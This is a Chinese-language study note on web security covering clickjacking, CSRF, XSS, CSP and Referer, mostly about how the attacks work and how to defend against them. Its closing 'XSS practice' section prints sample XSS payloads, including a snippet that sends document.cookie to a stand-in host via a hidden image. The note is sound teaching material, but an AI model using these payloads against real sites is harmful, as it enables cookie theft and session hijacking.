# web 安全

## 点击劫持

原理：攻击者使用透明的 iframe 覆盖在网页上，诱使用户在点击，

1. flash 点击劫持：用过 flash 游戏，让用户完成一系列复杂的操作
2. 图片覆盖攻击 Cross Site Image Overlaying（XSIO）：

## [CSFR](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)

### 概念

- 在受骗者已经登录对应网站生成 cookie 后，攻击者做一个网站让受骗者点击，这时受骗者的 cookie 还在，那么这个构造的网站就能够利用受骗者的 cookie 执行网站恶意请求
- CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容

### 特点

1. 发生在第三方域名
2. 不能获取到 cookie 只是借用（在请求参数中加上 cookie 并让服务器验证），但是跨域请求拿不到 cookie

### 攻击方式

由于 AJAX 是不支持跨域发送请求的，所以我们只能够用支持跨域请求的 img、script、form 表单来发起请求，这些请求的限制性很强

1. 通过 img\iframe\script 发起 get 请求
   - 由于 get 请求只能获取信息，不会修改数据库中信息，所以一般 get 请求伪造的影响较小。
2. 通过 js 提交 form 表单发起 post 请求
   - post 请求一般是通过表单发送，而表单请求不能修改请求头，也不能带上 query，所以这就是 token 防止 csrf 的原因

### [防护](https://zhuanlan.zhihu.com/p/40588156)

- referer check

- 验证码

- anti csfr token（普遍做法）

- **验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证**

- 同源检测防护
  1. origin（没有 path 和 query）
     - 在 IE 同源定义不一致
     - 302 重定向
       2 referer check（请求的来源地址）
  - 可以被修改
- csfr `Token`
  在会话中存储 CSRF Token 比较繁琐，而且不能在通用的拦截上统一处理所有的接口

- `验证码`和密码
  确认是用户自身的行为

- 双重 cookie 验证，生成一个随机 cookie 并且在请求时附带在 url 里面，后端就可以验证

- cookie 设置 samesite 属性、如果 SamesiteCookie 被设置为 Strict，浏览器在任何跨域请求中都不会携带 Cookie

## [XSS：跨站脚本攻击](https://www.freebuf.com/articles/web/185654.html)

[XSS](https://juejin.im/post/5bad9140e51d450e935c6d64#heading-13)

HTMl 注入插入恶意脚本，篡改网页，在用户浏览网页时，控制用户浏览器的一种攻击，一开始的演示案例是跨域的。

1. 攻击者提交恶意代码。
2. 浏览器执行恶意代码。

### 分类：

1. 存储型 XSS：也叫持久性 XSS，恶意代码提交到`服务器端`中，`服务端`拼接 html 返回，再在前端解析执行。常见于评论、私信、发博客。所有查看了该博客该评论的用户，都会执行这段恶意脚本
2. **反射性**XSS：也叫非持久性 XSS，输入恶意代码，通过`URL`提交执行，`服务端`取出恶意代码，拼接在 html 时返回，浏览器请求再执行恶意代码。
3. Dom 型 XSS：`前端`取出`URL`中的恶意代码执行，通过修改页面的 dom 节点形成的 XSS，称为 dom based XSS。

### 攻击方式

- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 background-image:url("javascript:…"); 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。

### 危害

1. document.cookie 获取 cookie 实现 cookie 劫持，可以通过绑定 IP 防御
2. 通过动态插入 img，在 src 赋值上构造 get 请求构造 get 请求
3. 通过动态添加 post 请求的 form 标签，构造 post 请求
4. 也可以直接通过 ajax 请求发送构造请求

### 预防

1. 设置 httponly 缓解 xss，可以通过 trace 请求读取 httponly cookie 反
2. 输入检查，输出检查
3. 输入过滤（输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。）
4. 预防存储型和反射型 XSS 攻击：改成纯前端渲染、充分转义
5. 预防 DOM 型 XSS 攻击：避免使用 DOM 中的内联事件监听器，
6. 使用 CSP

## [CSP（Content Security Policy）内容安全策略检查](http://www.ruanyifeng.com/blog/2016/09/csp.html)

- "网页安全政策"， CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单

- 如果只允许加载自己域的图片，可以 加上这个 meta 标签`<meta http-equiv="Content-Security-Policy" content="img-src 'self';">`

- `Content-Security-Policy: script-src 'self'`

- `Content-Security-Policy: default-src 'self'`

- 或者后端设置这个 http 响应头，self 表示本域，如果加载其他域的图片浏览器会报错

- ![image](https://pic4.zhimg.com/v2-bf28b28cd47bbab12b052811d52a1223_b.jpg)

- ```http
  Content-Security-Policy: script-src 'self'; object-src 'none';
  style-src cdn.example.org third-party.org; child-src https:
  ```

  - 脚本：只信任当前域名
  - `<object>`标签：不信任任何 URL，即不加载任何资源
  - 样式表：只信任`cdn.example.org`和`third-party.org`
  - 框架（frame）：必须使用 HTTPS 协议加载
  - 其他资源：没有限制

  参考：[前端安全配置之 Content-Security-Policy(csp)](https://www.cnblogs.com/heyuqing/p/6215761.html)

### **referer**

在以下两种情况下，Referer 不会被发送：
来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。

### XSS 实践

页面中插入链接点击会执行

```
<a href="javascript:alert(localStorage)">跳转</a>

<a href="http://xxx/search?keyword="><script>alert('XSS');</script>"></a>
=>拼接后
<input type="text" value=""><script>alert('XSS');</script>">
```

发送 cookie 给对应站点

```
  var img = document.createElement('img')
  img.src='http://www.xss.com?cookie=' + document.cookie
  img.style.display='none'
  document.getElementsByTagName('body')[0].appendChild(img)
```
